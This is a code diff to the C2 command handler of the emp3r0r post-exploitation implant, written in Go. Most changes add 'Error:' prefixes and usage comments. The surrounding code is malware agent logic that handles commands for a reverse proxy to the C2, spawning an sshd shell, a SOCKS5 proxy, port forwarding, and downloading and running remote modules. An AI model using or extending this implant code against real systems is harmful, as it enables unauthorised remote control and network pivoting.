@@ -21,17 +21,17 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	switch cmdSlice[0] {
 
 	// stat file
-
+	// !stat '/path/to/a file name.txt'
 	case emp3r0r_data.C2CmdStat:
 		if len(cmdSlice) < 2 {
-			out = fmt.Sprintf("args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
 
 		path := strings.Join(cmdSlice[1:], " ")
 		fi, err := os.Stat(path)
 		if err != nil || fi == nil {
-			out = fmt.Sprintf("cant stat file %s: %v", path, err)
+			out = fmt.Sprintf("Error: cant stat file %s: %v", path, err)
 			return
 		}
 		fstat := &util.FileStat{}
@@ -42,23 +42,24 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		fiData, err := json.Marshal(fstat)
 		out = string(fiData)
 		if err != nil {
-			out = fmt.Sprintf("cant marshal file info %s: %v", path, err)
+			out = fmt.Sprintf("Error: cant marshal file info %s: %v", path, err)
 		}
 		return
 
-	case emp3r0r_data.C2CmdReverseProxy:
+		// !bring2cc target_agent_ip
+	case emp3r0r_data.C2CmdBring2CC:
 		// reverse proxy
 		if len(cmdSlice) != 2 {
-			out = fmt.Sprintf("args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error args error: %v", cmdSlice)
 			return
 		}
 		addr := cmdSlice[1]
-		out = "Reverse proxy for " + addr + " finished"
+		out = "Bring2CC: Reverse proxy for " + addr + " finished"
 
 		hasInternet := tun.HasInternetAccess()
 		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy)
 		if !hasInternet && !isProxyOK {
-			out = "We dont have any internet to share"
+			out = "Error: We don't have any internet to share"
 		}
 		for p, cancelfunc := range ReverseConns {
 			if addr == p {
@@ -77,7 +78,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// !sshd id shell port args
 		log.Printf("Got sshd request: %s", cmdSlice)
 		if len(cmdSlice) < 3 {
-			out = fmt.Sprintf("args error: %s", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
 			log.Print(out)
 			return
 		}
@@ -88,13 +89,13 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = "success"
 			err = SSHD(shell, port, args)
 			if err != nil {
-				out = fmt.Sprintf("SSHD: %v", err)
+				out = fmt.Sprintf("Error: %v", err)
 			}
 		}()
 		for !tun.IsPortOpen("127.0.0.1", port) {
 			time.Sleep(100 * time.Millisecond)
 			if err != nil {
-				out = fmt.Sprintf("sshd failed to start: %v\n%s", err, out)
+				out = fmt.Sprintf("Error: sshd failed to start: %v\n%s", err, out)
 				break
 			}
 		}
@@ -104,7 +105,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// !proxy on 0.0.0.0:12345
 	case emp3r0r_data.C2CmdProxy:
 		if len(cmdSlice) != 3 {
-			out = fmt.Sprintf("args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			log.Print(out)
 			return
 		}
@@ -112,7 +113,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		addr := cmdSlice[2]
 		err = Socks5Proxy(cmdSlice[1], addr)
 		if err != nil {
-			out = fmt.Sprintf("Failed to start Socks5Proxy: %v", err)
+			out = fmt.Sprintf("Error: Failed to start Socks5Proxy: %v", err)
 		}
 		out = fmt.Sprintf("Socks5Proxy server ready with username %s and password %s",
 			RuntimeConfig.ShadowsocksPort,
@@ -120,10 +121,10 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 		// port fwd
-		// cmd format: !port_fwd [to/listen] [shID] [operation]
+		// cmd format: !port_fwd [to/listen] [shID] [operation/protocol] [timeout]
 	case emp3r0r_data.C2CmdPortFwd:
 		if len(cmdSlice) < 4 {
-			out = fmt.Sprintf("Invalid command: %v", cmdSlice)
+			out = fmt.Sprintf("Error: Invalid command: %v", cmdSlice)
 			return
 		}
 		out = "success"
@@ -133,17 +134,17 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			pf, exist := PortFwds[sessionID]
 			if exist {
 				pf.Cancel()
-				out = fmt.Sprintf("port mapping %s stopped", pf.Addr)
+				out = fmt.Sprintf("Warning: port mapping %s stopped", pf.Addr)
 				break
 			}
-			out = fmt.Sprintf("port mapping %s not found", pf.Addr)
+			out = fmt.Sprintf("Error: port mapping %s not found", pf.Addr)
 		case "reverse":
 			go func() {
 				addr := cmdSlice[1]
 				sessionID := cmdSlice[2]
 				err = PortFwd(addr, sessionID, "tcp", true, 0)
 				if err != nil {
-					out = fmt.Sprintf("PortFwd (reverse) failed: %v", err)
+					out = fmt.Sprintf("Error: PortFwd (reverse) failed: %v", err)
 				}
 			}()
 		default:
@@ -158,7 +159,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 
 				err = PortFwd(to, sessionID, protocol, false, timeout)
 				if err != nil {
-					out = fmt.Sprintf("PortFwd failed: %v", err)
+					out = fmt.Sprintf("Error: PortFwd failed: %v", err)
 				}
 			}()
 		}
@@ -166,6 +167,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 		// delete_portfwd
+		// !delete_portfwd id
 	case emp3r0r_data.C2CmdDeletePortFwd:
 		if len(cmdSlice) != 2 {
 			return
@@ -180,21 +182,27 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// download utils
 	case emp3r0r_data.C2CmdUtils:
 		out = VaccineHandler()
+		if out != "[+] Utils have been successfully installed" {
+			out = fmt.Sprintf("Error: %s", out)
+		}
+
 		return
 
 		// download a module and run it
+		// !custom_module mod_name checksum
 	case emp3r0r_data.C2CmdCustomModule:
 		if len(cmdSlice) != 3 {
-			out = fmt.Sprintf("args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
 		out = moduleHandler(cmdSlice[1], cmdSlice[2])
 		return
 
 		// upgrade
+		// !upgrade_agent checksum
 	case emp3r0r_data.C2CmdUpdateAgent:
 		if len(cmdSlice) != 2 {
-			out = fmt.Sprintf("args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
 
